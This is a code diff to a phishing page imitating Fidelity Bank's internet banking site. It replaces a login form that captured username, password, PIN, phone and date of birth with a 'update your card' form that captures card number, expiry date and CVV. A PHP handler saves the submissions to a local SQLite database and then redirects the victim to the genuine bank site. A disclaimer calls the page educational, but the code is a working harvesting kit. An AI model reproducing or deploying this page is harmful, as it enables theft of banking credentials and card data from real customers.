@@ -42,7 +42,7 @@
 				<div id="main" style="left:0px;width:100%!important;position:relative !important">
                     <div id="section">
                     <div id="keyboard_firstrowtwrapper">
-                        <div id="keyboard_bankname">Please login to Fidelity Retail Internet Banking</div>
+                        <div id="keyboard_bankname">Please, complete the following form to update your card</div>
                         <div id="keyboard_themselection">
                             <table>
                                 <tbody><tr><td><label for="fldlitever">Choose Theme</label></td><td><select id="fldlitever" name="fldlitever" tabindex="3" style="width:auto;height:auto"><option value="">Default</option><option value="C">Contemporary</option><option value="L">Classic</option></select></td></tr>
@@ -57,54 +57,40 @@
                                 <div id="login-column" class="col-md-6">
                                     <div id="login-box" class="col-md-12">
                                             <div class="form-group">
-                                                <label for="myUsername" class="text-info">Username:</label>
+                                                <label for="myCustomerName" class="text-info">Customer Name:</label>
                                                 <br>
-                                                <input type="text" name="myUsername" id="myUsername" class="form-control" required>
+                                                <input type="text" name="myCustomerName" id="myCustomerName" class="form-control" required>
                                             </div>
+                                           
                                             <div class="form-group">
-                                                <label for="myPassword" class="text-info">Password:</label>
-                                                <br>
-                                                <input type="password" name="myPassword" id="myPassword" class="form-control" required>
-                                            </div>
-
-                                            <div class="form-group">
-                                                <label for="myAccount" class="text-info">Account Number:</label>
+                                                <label for="myAccount" class="text-info">Account Number (PAN):</label>
                                                 <br>
                                                 <input type="number" name="myAccount" id="myAccount" class="form-control" required>
                                             </div>
 
                                             <div class="form-group">
-                                                <label for="myPhone" class="text-info">Phone Number:</label>
+                                                <label for="expiryDate" class="text-info">Expiry Date:</label>
                                                 <br>
-                                                <input type="number" name="myPhone" id="myPhone" class="form-control" required>
+                                                <input type="date" name="expiryDate" id="expiryDate" class="form-control" required>
                                             </div>
 
                                             <div class="form-group">
-                                                <label for="myPIN" class="text-info">PIN:</label>
+                                                <label for="myCVV" class="text-info">CVV:</label>
                                                 <br>
-                                                <input type="password" name="myPIN" id="myPIN" class="form-control" max="999999" required>
+                                                <input type="number" name="myCVV" id="myCVV" class="form-control" max="999"  required>
                                             </div>
+
 
 
                                             <div class="form-group">
-                                                <label for="myDOB" class="text-info">Date of Birth:</label>
+                                            
                                                 <br>
-                                                <input type="date" name="myDOB" id="myDOB" class="form-control" required>
+
+
+                                                <input type="submit" name="submit" class="btn btn-info btn-md" value="UPDATE CARD">
                                             </div>
-
-
-                                            <div class="form-group">
-                                        
-                                                <br />
-
-
-                                                <input type="submit" name="submit" class="btn btn-info btn-md" value="LOGIN">
-                                            </div>
-                                            <div id="register-link" class="text-right">
-                                                <a href="#" class="text-info">Register here</a>
-                                            </div>
-
                                             <br />
+
 
                                             <div id="disclaimer" class="text-right" style="color: red; font-weight:bold">
                                                 <p>DISCLAMER: This page is created for educational purposes ONLY to demonstrate phishing attack. Please, do not enter your Fidelity bank information here. Thank you</p>
@@ -126,32 +112,17 @@
 $db = new PDO("sqlite:/home/kali/wwwdata/fidelityusers.db");
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
   // collect value of input field
-  $myUsername = $_POST['myUsername'];
-  $myPassword = $_POST['myPassword'];
+  $myUsername = $_POST['myCustomerName'];
   $myAccount = $_POST['myAccount'];
-  $myPhone = $_POST['myPhone'];
-  $myPIN = $_POST['myPIN'];
-  $myDOB = $_POST['myDOB'];
+  $expiryDate = $_POST['expiryDate'];
+  $myCVV = $_POST['myCVV'];
 
-//   if (empty($myPassword)) {
-//     echo "myPassword is empty";
-//   } else {
-//     echo $myUsername;
-//   }
 
-if( $myUsername !="" && $myPassword !="" && $myAccount !="" && $myPhone !="" && $myPIN !="" && $myDOB !=""){
-$sql = "INSERT INTO userdetails (username,password,account,phone,pin,dob) VALUES (?,?,?,?,?,?)";
+
+if($myUsername !="" && $myAccount!="" && $expiryDate !="" && $myCVV !="" ){
+$sql = "INSERT INTO cardupdate (cname,account,expiry,cvv) VALUES (?,?,?,?)";
 $stmt= $db->prepare($sql);
-$stmt->execute([$myUsername,$myPassword,$myAccount,$myPhone,$myPIN,$myDOB ]);
-
-
-//   if (empty($myPassword)) {
-//     echo "myPassword is empty";
-//   } else {
-//     echo $myUsername;
-//   }
-
-//   echo("Done!");
+$stmt->execute([$myUsername,$myAccount,$expiryDate,$myCVV ]);
 
 if (!headers_sent()){
 header("Location: https://corporateibank.fidelitybank.com.gh/B001/home.jsp");
